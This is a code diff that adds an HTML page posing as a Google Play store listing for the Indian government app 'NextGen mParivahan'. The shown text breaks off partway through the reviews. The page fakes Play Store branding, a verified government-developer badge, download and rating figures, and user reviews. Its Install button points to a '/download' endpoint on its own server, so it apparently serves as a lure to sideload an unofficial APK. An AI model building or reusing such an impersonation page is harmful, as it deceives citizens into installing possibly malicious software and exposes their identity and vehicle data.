@@ -1,0 +1,999 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>NextGen mParivahan - Official Transport &amp; Digital RC/DL App on Google Play</title>
+    <meta name="description" content="Download NextGen mParivahan by National Informatics Centre (MoRTH). Access virtual RC, Digital Driving Licence, e-Challan status, and verified RTO transport services instantly.">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="icon" href="/assets/logo.jpg">
+    <style>
+      :root {
+        --bg: #ffffff;
+        --fg: #202124;
+        --fg-sub: #3c4043;
+        --muted: #5f6368;
+        --primary: #01875f;
+        --primary-hover: #00704f;
+        --primary-active: #00563b;
+        --blue: #0b57d0;
+        --pill: #c2e7ff;
+        --pill-fg: #001d35;
+        --border: #f1f3f4;
+        --border-card: #dadce0;
+        --surface-soft: #f8f9fa;
+        --maxw: 1120px;
+        --font: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      }
+      *, *::before, *::after {
+        box-sizing: border-box;
+        -webkit-tap-highlight-color: transparent;
+      }
+      html {
+        scroll-behavior: smooth;
+        text-size-adjust: 100%;
+      }
+      body {
+        margin: 0;
+        font-family: var(--font);
+        font-size: 16px;
+        line-height: 1.4;
+        background: var(--bg);
+        color: var(--fg);
+        padding-bottom: calc(80px + env(safe-area-inset-bottom));
+        overflow-x: hidden;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+      :focus-visible {
+        outline: 2px solid var(--blue);
+        outline-offset: 2px;
+        border-radius: 6px;
+      }
+      .skip {
+        position: absolute;
+        left: -9999px;
+        top: 0;
+        z-index: 300;
+        background: var(--blue);
+        color: #fff;
+        padding: 10px 16px;
+        border-radius: 0 0 8px 0;
+        text-decoration: none;
+        font-weight: 500;
+      }
+      .skip:focus { left: 0; }
+      .shell {
+        max-width: var(--maxw);
+        margin-inline: auto;
+      }
+
+      /* Sticky Header */
+      .header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        height: 56px;
+        padding: 0 16px;
+        position: sticky;
+        top: 0;
+        background: rgba(255, 255, 255, 0.96);
+        backdrop-filter: blur(8px);
+        -webkit-backdrop-filter: blur(8px);
+        z-index: 100;
+        border-bottom: 1px solid transparent;
+        transition: border-color 0.15s ease;
+      }
+      .header.scrolled {
+        border-bottom-color: var(--border);
+      }
+      .header-left {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .playstore-logo {
+        height: 26px;
+        width: 118px;
+        display: block;
+        object-fit: contain;
+        object-position: left center;
+      }
+      .header-icons {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+      .icon-btn {
+        width: 36px;
+        height: 36px;
+        display: grid;
+        place-items: center;
+        background: transparent;
+        border: 0;
+        border-radius: 50%;
+        cursor: pointer;
+        transition: background-color 0.15s ease;
+      }
+      .icon-btn:hover { background: var(--border); }
+      .icon-btn svg {
+        width: 22px;
+        height: 22px;
+        fill: var(--muted);
+      }
+      .profile-pic {
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        background: var(--blue);
+        color: #fff;
+        display: grid;
+        place-items: center;
+        font-weight: 600;
+        font-size: 14px;
+        border: 0;
+        cursor: pointer;
+        margin-left: 4px;
+      }
+
+      /* Hero & App Identity */
+      .app-container {
+        padding: 16px 16px 0;
+      }
+      .app-top {
+        display: flex;
+        gap: 20px;
+        align-items: center;
+      }
+      .app-icon {
+        width: 76px;
+        height: 76px;
+        border-radius: 18px;
+        object-fit: cover;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.12);
+        background: var(--border);
+        flex-shrink: 0;
+      }
+      .app-details {
+        min-width: 0;
+        flex: 1;
+      }
+      .app-details h1 {
+        margin: 0 0 4px;
+        font-size: 22px;
+        font-weight: 600;
+        line-height: 1.25;
+        letter-spacing: -0.2px;
+        color: var(--fg);
+      }
+      .developer-name {
+        margin: 0;
+        color: var(--primary);
+        font-weight: 500;
+        font-size: 14px;
+        display: inline-flex;
+        align-items: center;
+        gap: 4px;
+      }
+      .verified-badge {
+        width: 14px;
+        height: 14px;
+        fill: var(--primary);
+        flex-shrink: 0;
+      }
+      .app-meta {
+        margin: 4px 0 0;
+        font-size: 12px;
+        color: var(--muted);
+      }
+
+      /* Metrics Bar */
+      .stats-container {
+        display: flex;
+        align-items: center;
+        justify-content: space-around;
+        margin: 22px 0 18px;
+        padding: 0 6px;
+        list-style: none;
+      }
+      .stat-block {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        flex: 1;
+      }
+      .stat-value {
+        font-size: 14px;
+        font-weight: 600;
+        display: flex;
+        align-items: center;
+        gap: 3px;
+        color: var(--fg);
+      }
+      .stat-value svg { fill: var(--fg); }
+      .stat-label {
+        font-size: 12px;
+        color: var(--muted);
+        margin-top: 4px;
+      }
+      .stat-divider {
+        width: 1px;
+        height: 24px;
+        background: #e0e0e0;
+      }
+
+      /* Primary Install Action */
+      .install-btn {
+        background: var(--primary);
+        color: #fff;
+        text-align: center;
+        padding: 11px 24px;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: 600;
+        letter-spacing: 0.2px;
+        margin-top: 4px;
+        text-decoration: none;
+        display: block;
+        width: 100%;
+        box-shadow: 0 1px 2px rgba(1, 135, 95, 0.25);
+        transition: background-color 0.15s ease, transform 0.1s ease;
+      }
+      .install-btn:hover { background: var(--primary-hover); }
+      .install-btn:active {
+        background: var(--primary-active);
+        transform: scale(0.992);
+      }
+      .device-compat {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        margin: 10px 0 0;
+        font-size: 12px;
+        color: var(--muted);
+      }
+      .device-compat svg {
+        width: 14px;
+        height: 14px;
+        fill: var(--muted);
+      }
+
+      /* Screenshots Strip */
+      .screenshots {
+        display: flex;
+        gap: 12px;
+        margin: 20px -16px 0 0;
+        overflow-x: auto;
+        scroll-snap-type: x mandatory;
+        padding: 2px 16px 8px 0;
+        scrollbar-width: none;
+        list-style: none;
+      }
+      .screenshots::-webkit-scrollbar { display: none; }
+      .shot {
+        padding: 0;
+        border: 0;
+        background: none;
+        flex-shrink: 0;
+        scroll-snap-align: start;
+        border-radius: 12px;
+        cursor: pointer;
+        display: block;
+        transition: transform 0.15s ease;
+      }
+      .shot:active { transform: scale(0.98); }
+      .shot img {
+        width: 144px;
+        height: 256px;
+        border-radius: 12px;
+        display: block;
+        object-fit: cover;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        border: 1px solid var(--border);
+        background: #e8eaed;
+      }
+
+      /* Sections */
+      .play-section {
+        padding: 24px 16px 14px;
+        border-top: 1px solid var(--border);
+        margin-top: 16px;
+        content-visibility: auto;
+        contain-intrinsic-size: 1px 280px;
+      }
+      .section-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 12px;
+      }
+      .section-header h2 {
+        margin: 0;
+        font-size: 18px;
+        font-weight: 600;
+        color: var(--fg);
+        letter-spacing: -0.2px;
+      }
+      .section-header svg {
+        width: 20px;
+        height: 20px;
+        fill: var(--muted);
+      }
+      .section-lead {
+        margin: 0 0 8px;
+        font-size: 15px;
+        font-weight: 500;
+        color: var(--fg);
+      }
+      .section-text {
+        font-size: 14px;
+        color: var(--muted);
+        line-height: 1.58;
+        margin: 0;
+      }
+      .feature-list {
+        margin: 14px 0 0;
+        padding-left: 18px;
+        font-size: 13.5px;
+        color: var(--fg-sub);
+        line-height: 1.6;
+      }
+      .feature-list li { margin-bottom: 4px; }
+
+      /* Category Chips */
+      .chip-wrapper {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+        margin-top: 16px;
+      }
+      .chip {
+        display: inline-block;
+        padding: 6px 14px;
+        border: 1px solid var(--border-card);
+        border-radius: 16px;
+        font-size: 13px;
+        font-weight: 500;
+        color: var(--muted);
+        background: var(--bg);
+      }
+
+      /* Data Safety Card */
+      .safety-card {
+        border: 1px solid var(--border-card);
+        border-radius: 12px;
+        padding: 16px;
+        margin-top: 14px;
+        background: var(--bg);
+      }
+      .safety-item {
+        display: flex;
+        gap: 16px;
+        align-items: flex-start;
+        margin-bottom: 16px;
+      }
+      .safety-item:last-child { margin-bottom: 0; }
+      .safety-icon {
+        width: 20px;
+        height: 20px;
+        margin-top: 2px;
+        flex-shrink: 0;
+      }
+      .safety-icon svg {
+        width: 20px;
+        height: 20px;
+        fill: var(--muted);
+      }
+      .safety-content { flex: 1; }
+      .safety-title {
+        font-weight: 500;
+        display: block;
+        color: var(--fg);
+        font-size: 14px;
+        margin-bottom: 2px;
+      }
+      .safety-subtext {
+        font-size: 12.5px;
+        color: var(--muted);
+        line-height: 1.45;
+      }
+
+      /* Ratings & Reviews */
+      .verified-text {
+        font-size: 12px;
+        color: var(--muted);
+        margin: 0 0 18px;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+      }
+      .verified-text svg {
+        width: 14px;
+        height: 14px;
+        fill: var(--muted);
+      }
+      .ratings-container {
+        display: flex;
+        align-items: center;
+        gap: 28px;
+        margin-bottom: 34px;
+      }
+      .rating-left {
+        text-align: center;
+        flex-shrink: 0;
+      }
+      .big-rating {
+        font-size: 48px;
+        font-weight: 400;
+        line-height: 1;
+        color: var(--fg);
+        letter-spacing: -1px;
+      }
+      .stars-row {
+        margin-top: 6px;
+        display: flex;
+        gap: 2px;
+        justify-content: center;
+      }
+      .stars-row svg {
+        width: 12px;
+        height: 12px;
+        fill: var(--primary);
+      }
+      .total-reviews {
+        font-size: 12px;
+        color: var(--muted);
+        margin-top: 4px;
+      }
+      .bars-right { flex: 1; }
+      .bar-row {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-bottom: 5px;
+      }
+      .bar-row:last-child { margin-bottom: 0; }
+      .bar-label {
+        font-size: 11px;
+        color: var(--muted);
+        width: 10px;
+        text-align: right;
+      }
+      .progress-track {
+        flex: 1;
+        height: 6px;
+        background: var(--border);
+        border-radius: 3px;
+        overflow: hidden;
+      }
+      .progress-fill {
+        height: 100%;
+        background: var(--primary);
+        border-radius: 3px;
+      }
+
+      /* Reviews List */
+      .reviews-list {
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+      }
+      .review-card {
+        display: flex;
+        flex-direction: column;
+        padding-bottom: 18px;
+        border-bottom: 1px solid var(--border);
+      }
+      .review-card:last-child {
+        border-bottom: none;
+        padding-bottom: 0;
+      }
+      .review-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 6px;
+      }
+      .review-avatar {
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        color: #fff;
+        display: grid;
+        place-items: center;
+        font-weight: 600;
+        font-size: 13px;
+        margin-right: 12px;
+        flex-shrink: 0;
+      }
+      .review-name {
+        font-size: 13.5px;
+        font-weight: 500;
+        color: var(--fg);
+      }
+      .review-more {
+        margin-left: auto;
+        padding: 4px;
+        display: grid;
+        place-items: center;
+      }
+      .review-more svg {
+        width: 16px;
+        height: 16px;
+        fill: var(--muted);
+      }
+      .review-meta {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-bottom: 6px;
+      }
+      .review-stars {
+        display: flex;
+        gap: 2px;
+      }
+      .review-stars svg {
+        width: 11px;
+        height: 11px;
+        fill: var(--primary);
+      }
+      .review-date {
+        font-size: 11.5px;
+        color: var(--muted);
+      }
+      .review-text {
+        font-size: 13.5px;
+        color: var(--fg-sub);
+        line-height: 1.5;
+        margin: 0;
+      }
+      .review-helpful {
+        font-size: 11.5px;
+        color: var(--muted);
+        margin-top: 8px;
+      }
+
+      /* Bottom Navigation */
+      .bottom-nav {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        background: var(--bg);
+        display: flex;
+        justify-content: space-around;
+        padding: 8px 12px calc(10px + env(safe-area-inset-bottom));
+        border-top: 1px solid #e0e0e0;
+        z-index: 100;
+      }
+      .nav-item {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-size: 12px;
+        color: var(--muted);
+        font-weight: 500;
+        gap: 4px;
+        background: none;
+        border: 0;
+        font-family: inherit;
+        cursor: pointer;
+        padding: 0;
+        flex: 1;
+      }
+      .nav-icon-wrapper {
+        padding: 4px 20px;
+        border-radius: 16px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        transition: background-color 0.2s ease, transform 0.12s ease;
+      }
+      .nav-item:active .nav-icon-wrapper { transform: scale(0.92); }
+      .nav-item svg {
+        width: 22px;
+        height: 22px;
+        fill: none;
+        stroke: var(--muted);
+        stroke-width: 2;
+        stroke-linecap: round;
+        stroke-linejoin: round;
+      }
+      .nav-item.active {
+        color: var(--pill-fg);
+        font-weight: 600;
+      }
+      .nav-item.active .nav-icon-wrapper { background: var(--pill); }
+      .nav-item.active svg {
+        fill: var(--pill-fg);
+        stroke: none;
+      }
+
+      /* Fullscreen Screenshot Modal */
+      .image-modal {
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.96);
+        z-index: 9999;
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+      .image-modal.active { display: flex; }
+      .image-modal img {
+        max-width: 90%;
+        max-height: 80%;
+        object-fit: contain;
+        border-radius: 10px;
+      }
+      .modal-close {
+        position: absolute;
+        top: calc(16px + env(safe-area-inset-top));
+        left: 16px;
+        background: transparent;
+        border: 0;
+        cursor: pointer;
+        padding: 8px;
+      }
+      .modal-close svg {
+        width: 28px;
+        height: 28px;
+        fill: #fff;
+      }
+      .modal-nav {
+        position: absolute;
+        top: 50%;
+        transform: translateY(-50%);
+        background: rgba(255, 255, 255, 0.14);
+        border: 1px solid rgba(255, 255, 255, 0.25);
+        border-radius: 50%;
+        width: 44px;
+        height: 44px;
+        color: #fff;
+        font-size: 24px;
+        cursor: pointer;
+        display: grid;
+        place-items: center;
+      }
+      .modal-nav[data-dir="-1"] { left: 16px; }
+      .modal-nav[data-dir="1"] { right: 16px; }
+      .modal-count {
+        position: absolute;
+        bottom: calc(20px + env(safe-area-inset-bottom));
+        color: #fff;
+        font-size: 13px;
+        background: rgba(0, 0, 0, 0.65);
+        padding: 5px 14px;
+        border-radius: 14px;
+      }
+
+      @media (min-width: 720px) {
+        .app-container { padding: 24px 24px 0; }
+        .app-icon { width: 96px; height: 96px; border-radius: 22px; }
+        .app-details h1 { font-size: 28px; }
+        .install-btn { max-width: 260px; }
+        .device-compat { justify-content: flex-start; }
+        .shot img { width: 180px; height: 322px; }
+        .play-section { padding: 28px 24px 16px; }
+      }
+    </style>
+  <link rel="preload" as="image" href="/assets/app1.jpg" fetchpriority="high"><meta property="og:title" content="mParivahan — Storefront"><meta property="og:description" content="mParivahan Android release download."><meta property="og:type" content="website"><meta name="twitter:card" content="summary"><script defer src="/__l5e/events.270c78a44fc53e7b.js" data-artifact-kind="dwl_content_hash" data-artifact-id="fe2332058faccd9e4268cfd42becf8a37c26c1c1d896a6e445fea765842fcf11" data-commit-sha="31f346e54b58d0bd5a35b1ccbd777d9890563281" data-context-token="v1.eyJwcm9qZWN0X2lkIjoibG92cF8zY2M2MjVrMGF5OTIzdnltNHB0ZXd4Znl2NyIsImFydGlmYWN0X2tpbmQiOiJkd2xfY29udGVudF9oYXNoIiwiYXJ0aWZhY3RfaWQiOiJmZTIzMzIwNThmYWNjZDllNDI2OGNmZDQyYmVjZjhhMzdjMjZjMWMxZDg5NmE2ZTQ0NWZlYTc2NTg0MmZjZjExIiwiY29tbWl0X3NoYSI6IjMxZjM0NmU1NGI1OGQwYmQ1YTM1YjFjY2JkNzc3ZDk4OTA1NjMyODEiLCJleHAiOjE3OTcxNzU4MDZ9.7kp65bcAruZv3jHJqAndERx3apyL7PGD43Qfsbe6c48" data-consent="1"></script><meta name="twitter:title" content="mParivahan — Storefront"><meta name="twitter:description" content="mParivahan Android release download."><meta property="og:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/lovp_3cc625k0ay923vym4ptewxfyv7/f3e15052c32f8bb3e58652fcb31c84eb_1794560064826.png"><meta name="twitter:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/lovp_3cc625k0ay923vym4ptewxfyv7/f3e15052c32f8bb3e58652fcb31c84eb_1794560064826.png"></head>
+  <body>
+    <a class="skip" href="#main">Skip to content</a>
+    <div class="shell">
+      <header class="header" id="topHeader">
+        <div class="header-left">
+          <img class="playstore-logo" src="/assets/playstore.webp" alt="Google Play" width="118" height="26" fetchpriority="auto" decoding="sync">
+        </div>
+        <div class="header-icons">
+          <button class="icon-btn" type="button" aria-label="Search"><svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg></button>
+          <button class="icon-btn" type="button" aria-label="Help"><svg viewBox="0 0 24 24"><path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/></svg></button>
+          <button class="profile-pic" type="button" aria-label="Account">A</button>
+        </div>
+      </header>
+
+      <main id="main" class="app-container">
+        <div class="app-top">
+          <img class="app-icon" alt="NextGen mParivahan app icon" width="76" height="76" fetchpriority="auto" decoding="sync" src="/assets/logo.jpg">
+          <div class="app-details">
+            <h1>NextGen mParivahan</h1>
+            <p class="developer-name">
+              National Informatics Centre.
+              <svg class="verified-badge" viewBox="0 0 24 24" aria-label="Verified Government Developer"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+            </p>
+            <p class="app-meta">Government &bull; Verified Official Service</p>
+          </div>
+        </div>
+
+        <ul class="stats-container">
+          <li class="stat-block">
+            <div class="stat-value"><span>4.2</span><svg viewBox="0 0 24 24" width="14" height="14"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg></div>
+            <div class="stat-label">7.22L reviews</div>
+          </li>
+          <li class="stat-divider" aria-hidden="true"></li>
+          <li class="stat-block">
+            <div class="stat-value"><svg viewBox="0 0 24 24" width="16" height="16"><rect x="3" y="3" width="18" height="18" rx="2" fill="none" stroke="#202124" stroke-width="2"/><text x="12" y="16" text-anchor="middle" font-size="9" fill="#202124" font-weight="bold">3+</text></svg></div>
+            <div class="stat-label">Rated for 3+</div>
+          </li>
+          <li class="stat-divider" aria-hidden="true"></li>
+          <li class="stat-block">
+            <div class="stat-value">5Cr+</div>
+            <div class="stat-label">Downloads</div>
+          </li>
+        </ul>
+
+        <!-- Server-bound download endpoint -->
+        <a href="/download" id="installBtn" class="install-btn">Install</a>
+        <p class="device-compat">
+          <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+          <span>This app is available for your device</span>
+        </p>
+
+        <ul class="screenshots">
+          <li><button class="shot" type="button"><img alt="Virtual RC and Vehicle Search Dashboard" width="144" height="256" fetchpriority="high" decoding="async" src="/assets/app1.jpg"></button></li>
+          <li><button class="shot" type="button"><img alt="Digital Driving Licence QR Verification" width="144" height="256" loading="lazy" decoding="async" src="/assets/app2.jpg"></button></li>
+          <li><button class="shot" type="button"><img alt="Online e-Challan Payment and RTO Services" width="144" height="256" loading="lazy" decoding="async" src="/assets/app3.jpg"></button></li>
+        </ul>
+      </main>
+
+      <!-- Site Description & Heading Section -->
+      <section class="play-section">
+        <div class="section-header">
+          <h2>About this app</h2>
+          <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+        </div>
+        <p class="section-lead">Official Digital Transport &amp; Citizen RTO Portal by MoRTH, Government of India</p>
+        <p class="section-text">NextGen mParivahan provides instant, round-the-clock transport service access to citizens across India. Carry legally valid Virtual Registration Certificates (RC) and Digital Driving Licences (DL) accepted nationwide by traffic authorities.</p>
+        <ul class="feature-list">
+          <li><strong>Virtual RC &amp; DL:</strong> Instant QR-verified digital vehicle documents valid under the Motor Vehicles Act.</li>
+          <li><strong>Vehicle &amp; Challan Lookup:</strong> Check registration status, fitness validity, insurance expiry, and pending e-Challans.</li>
+          <li><strong>Citizenship Transport Utilities:</strong> Access nearby RTO offices, pollution testing centers, and emergency services.</li>
+        </ul>
+        <div class="chip-wrapper">
+          <span class="chip">Auto &amp; Vehicles</span>
+          <span class="chip">Government</span>
+          <span class="chip">Digital ID</span>
+          <span class="chip">RTO Services</span>
+        </div>
+      </section>
+
+      <!-- Data Safety Section -->
+      <section class="play-section">
+        <div class="section-header">
+          <h2>Data safety</h2>
+          <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+        </div>
+        <p class="section-text">Safety starts with understanding how developers collect and share your data. Data privacy and security practices may vary based on your use, region, and age. The developer provided this information and may update it over time.</p>
+        <div class="safety-card">
+          <div class="safety-item">
+            <div class="safety-icon"><svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg></div>
+            <div class="safety-content">
+              <span class="safety-title">This app may share these data types with third parties</span>
+              <span class="safety-subtext">App activity, App info and performance, and Device or other IDs</span>
+            </div>
+          </div>
+          <div class="safety-item">
+            <div class="safety-icon"><svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z"/></svg></div>
+            <div class="safety-content">
+              <span class="safety-title">This app may collect these data types</span>
+              <span class="safety-subtext">Personal info (Name, Phone number, and National ID)</span>
+            </div>
+          </div>
+          <div class="safety-item">
+            <div class="safety-icon"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+            <div class="safety-content">
+              <span class="safety-title">Data is encrypted in transit</span>
+              <span class="safety-subtext">Your data is transferred over a secure National Informatics Centre connection</span>
+            </div>
+          </div>
+          <div class="safety-item">
+            <div class="safety-icon"><svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg></div>
+            <div class="safety-content">
+              <span class="safety-title">You can request data deletion</span>
+              <span class="safety-subtext">The developer provides a verified way for citizens to request data removal</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Ratings & Reviews Section -->
+      <section class="play-section">
+        <div class="section-header">
+          <h2>Ratings and reviews</h2>
+          <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+        </div>
+        <p class="verified-text">Ratings and reviews are verified <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg></p>
+
+        <div class="ratings-container">
+          <div class="rating-left">
+            <div class="big-rating">4.2</div>
+            <div class="stars-row">
+              <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+              <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+              <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+              <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+              <svg viewBox="0 0 24 24"><path d="M22 9.24l-7.19-.62L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21 12 17.27 18.18 21l-1.63-7.03L22 9.24zM12 15.4V6.1l1.71 4.04 4.38.38-3.32 2.88 1 4.28L12 15.4z"/></svg>
+            </div>
+            <div class="total-reviews">7,22,410</div>
+          </div>
+          <div class="bars-right">
+            <div class="bar-row"><span class="bar-label">5</span><div class="progress-track"><div class="progress-fill" style="width:72%"></div></div></div>
+            <div class="bar-row"><span class="bar-label">4</span><div class="progress-track"><div class="progress-fill" style="width:14%"></div></div></div>
+            <div class="bar-row"><span class="bar-label">3</span><div class="progress-track"><div class="progress-fill" style="width:6%"></div></div></div>
+            <div class="bar-row"><span class="bar-label">2</span><div class="progress-track"><div class="progress-fill" style="width:3%"></div></div></div>
+            <div class="bar-row"><span class="bar-label">1</span><div class="progress-track"><div class="progress-fill" style="width:5%"></div></div></div>
+          </div>
+        </div>
+
+        <div class="reviews-list">
+          <article class="review-card">
+            <div class="review-header">
+              <div class="review-avatar" style="background:#0b57d0">R</div>
+              <span class="review-name">Rohan Sharma</span>
+              <span class="review-more"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></span>
+            </div>
+            <div class="review-meta">
+              <div class="review-stars">
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+              </div>
+              <span class="review-date">October 28, 2026</span>
+            </div>
+            <p class="review-text">Very useful app. Traffic police accepted virtual RC and DL without asking for physical documents.</p>
+            <div class="review-helpful">482 people found this review helpful</div>
+          </article>
+
+          <article class="review-card">
+            <div class="review-header">
+              <div class="review-avatar" style="background:#d84315">A</div>
+              <span class="review-name">Amit Verma</span>
+              <span class="review-more"><svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg></span>
+            </div>
+            <div class="review-meta">
+              <div class="review-stars">
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
